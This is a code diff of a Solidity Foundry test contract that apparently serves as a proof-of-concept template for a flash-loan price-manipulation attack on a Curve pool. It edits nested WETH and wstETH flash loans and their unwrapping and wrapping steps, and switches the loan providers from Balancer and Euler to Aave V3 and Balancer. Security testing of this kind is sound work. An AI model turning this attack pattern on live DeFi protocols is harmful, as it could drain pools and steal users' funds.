@@ -18,12 +18,13 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
         console.log("---------------------------------------------------------------------------");
         console.log("Curve Virtual Price BEFORE:", curvePool.get_virtual_price());
         // Deal ether to cover fees and losses
+        deal(EthereumTokens.WETH, address(this), 22.3 ether);
         deal(EthereumTokens.NATIVE_ASSET, address(this), 3.5 ether);
-        takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.WETH, 50000e18);
+        takeFlashLoan(FlashLoanProviders.AAVEV3, EthereumTokens.WETH, 50000e18);
     }
 
     function _executeAttack() internal override(PriceManipulation, FlashLoan) {
-        if (currentFlashLoanProvider() == FlashLoanProviders.EULER) {
+        if (currentFlashLoanProvider() == FlashLoanProviders.BALANCER) {
             // Unwrap flash loaned wstETH to manipulate Curve pool
             console.log("---------------------------------------------------------------------------");
             IWrapped(address(EthereumTokens.wstETH)).unwrap(50000e18);
@@ -41,12 +42,12 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
             // Wrap stETH to pay back flash loan
             EthereumTokens.stETH.approve(address(EthereumTokens.wstETH), type(uint256).max);
             IWrapped(address(EthereumTokens.wstETH)).wrap(EthereumTokens.stETH.balanceOf(address(this)));
-        } else if (currentFlashLoanProvider() == FlashLoanProviders.BALANCER) {
+        } else if (currentFlashLoanProvider() == FlashLoanProviders.AAVEV3) {
             // Unwrap ether to use in price manipulation
             IWrappedEther(address(EthereumTokens.WETH)).withdraw(50000e18);
 
             // Borrow wstETH
-            takeFlashLoan(FlashLoanProviders.EULER, EthereumTokens.wstETH, 50000e18);
+            takeFlashLoan(FlashLoanProviders.BALANCER, EthereumTokens.wstETH, 50000e18);
 
             // Unrawp wstETH and swap stETH to Ether to pay back balancer loan
             IWrapped(address(EthereumTokens.wstETH)).unwrap(EthereumTokens.wstETH.balanceOf(address(this)));
